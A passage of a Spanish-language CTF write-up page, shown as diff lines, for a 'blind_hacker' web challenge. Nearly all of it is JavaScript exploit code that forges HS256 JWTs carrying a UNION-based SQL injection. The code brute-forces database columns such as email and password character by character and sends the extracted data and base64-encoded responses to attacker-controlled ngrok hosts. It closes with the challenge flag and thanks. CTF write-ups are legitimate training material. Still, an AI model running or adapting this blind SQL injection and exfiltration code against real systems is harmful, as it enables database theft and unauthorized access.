+                get(&#34;http://blind_hacker_forum/check?indextoken=&#34; &#43;token1 &#43; &#34;&amp;forumtoken=&#34;&#43;token2, forum =&gt; {
+                        if(isTrue(forum)){
+                            get(&#34;http://f9ee0285b7f5.ngrok.io/&#34; &#43; i &#43; &#34;___&#34; &#43; isTrue(forum) &#43; &#34;___&#34; &#43; btoa(forum.responseText &#43; &#34;\n\n&#34; &#43; forum.getAllResponseHeaders()), () =&gt; {});
+                            //get(&#34;http://f9ee0285b7f5.ngrok.io/&#34; &#43; i, () =&gt; {});
+                        }
+                }, auth_string);
+            }
+    });
+});
+}
+// Primero extraeremos la longitud de los valores de las columnas de la BBDD. Despues utilizaremos la funcion recursive para extraer los propios datos.
+//extractLengths(&#34;is_admin&#34;); // Campos validos: email, password, username, is_admin
+
+function recursive(base, size, column){
+get(&#34;http://blind_hacker/token.php&#34;, first =&gt; {
+    let items = first.responseText.split(&#34; &#34;);
+    let token1 = items[items.length - 1];
+    get(&#34;http://blind_hacker_forum/token&#34;, second =&gt; {
+            let items = second.responseText.split(&#34; &#34;);
+            let token2 = items[items.length - 1];
+
+            let alphabet = &#34;abcdefghijklmnopqrstuvwxyz0123456789@/.,&lt;&gt;?;:&#39;[]{}| =-&#43;)(*&amp;^$#@!&#34;;
+            for(let i = 0; i&lt;alphabet.length; i&#43;&#43;){
+                let payload = base &#43; alphabet[i];
+                while(payload.replace(&#34;\\&#34;, &#34;&#34;).length&lt;size){ // La \ no cuenta como caracter, se utiliza solo para escapar la _
+                    payload &#43;= &#34;_&#34;;
+                }
+                
+                let serialized_payload = JSON.stringify({
+                    id: &#34;1337&#34;,
+                    username: &#34;imaginary&#34;,
+                    password: &#34;imaginary&#34;,
+                    email: &#34;doesnot@exist&#34;,
+                    is_admin: &#34;yes&#39; union all select username,version(),&#39;1&#39;,&#39;1&#39; from userinfo where &#34; &#43; column &#43; &#34; lIkE &#39;&#34; &#43; payload &#43; &#34;&#39; -- &#34;
+                });
+                
+                
+                let auth_string = KJUR.jws.JWS.sign(&#34;HS256&#34;, serialized_headers, serialized_payload, &#34;cookie&#34;);
+                get(&#34;http://blind_hacker_forum/check?indextoken=&#34; &#43;token1 &#43; &#34;&amp;forumtoken=&#34;&#43;token2, forum =&gt; {
+                        if(isTrue(forum)){
+                            get(&#34;http://ca2116f71dd7.ngrok.io/&#34; &#43; payload, () =&gt; {});
+                            recursive(base &#43; alphabet[i], size, column);  // &#43; &#34;___&#34; &#43; btoa(forum.responseText)
+                        }
+                }, auth_string);
+            }
+            
+            // Copy paste del contenido del for para el caso especial _
+            let payload = base &#43; &#34;\\_&#34;;
+            while(payload.replace(&#34;\\&#34;, &#34;&#34;).length&lt;size){ // La \ no cuenta como caracter, se utiliza solo para escapar la _
+                payload &#43;= &#34;_&#34;;
+            }
+            
+            let serialized_payload = JSON.stringify({
+                id: &#34;1337&#34;,
+                username: &#34;imaginary&#34;,
+                password: &#34;imaginary&#34;,
+                email: &#34;doesnot@exist&#34;,
+                is_admin: &#34;yes&#39; union all select username,version(),&#39;1&#39;,&#39;1&#39; from userinfo where &#34; &#43; column &#43; &#34; lIkE &#39;&#34; &#43; payload &#43; &#34;&#39; -- &#34;
+            });
+            
+            let auth_string = KJUR.jws.JWS.sign(&#34;HS256&#34;, serialized_headers, serialized_payload, &#34;cookie&#34;);
+            get(&#34;http://blind_hacker_forum/check?indextoken=&#34; &#43;token1 &#43; &#34;&amp;forumtoken=&#34;&#43;token2, forum =&gt; {
+                    if(isTrue(forum)){
+                        get(&#34;http://ca2116f71dd7.ngrok.io/&#34; &#43; payload, () =&gt; {});
+                        recursive(base &#43; &#34;\\_&#34;, size, column);
+                    }
+            }, auth_string);
+    });
+});
+}
+
+// Flag: r34d1ng_wr1teups_1s_n1ce_but_d01ng_th3m_1s_b3tt3r
+
+
+//recursive(&#34;&#34;,19,&#34;email&#34;); // Extraer el valor con longitud 19 de la columna email
+recursive(&#34;&#34;,11,&#34;is_admin&#34;); // Extraer el valor con longitud 11 de la columna is_admin
+// Extraemos todos los datos de la bbdd dada su columna y su longitud, y opcionamente un prefijo para continuar en caso de error
+</code></pre>
+  </div>
+
+</p>
+<h2 id="final">Final<a href="#final" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Bueno, ¿y la flag? ¿dónde está?
+La flag del reto se encuentra repartida entre la primera y la segunda base de datos, ¡ve a por ella!</p>
+<p>Gracias a JorgeCTF por el reto, a Gonzalo por un tip para la Fase 2, y al bote de gel hidroalcohólico por ayudar a desinfectarme después de utilizar Javascript.</p>
+<p>Cualquier feedback sobre el writeup es bienvenido :)</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Leer otras publicaciones</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://raulmart.in/es/posts/uam-julio/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Una Al Mes - Julio 2020</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://raulmart.in/es/posts/cybex-ctf-2020/">
+                <span class="button__text">Cybex 2020 CTF</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script src="https://raulmart.in/js/menu.js"></script>
+<script src="https://raulmart.in/js/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
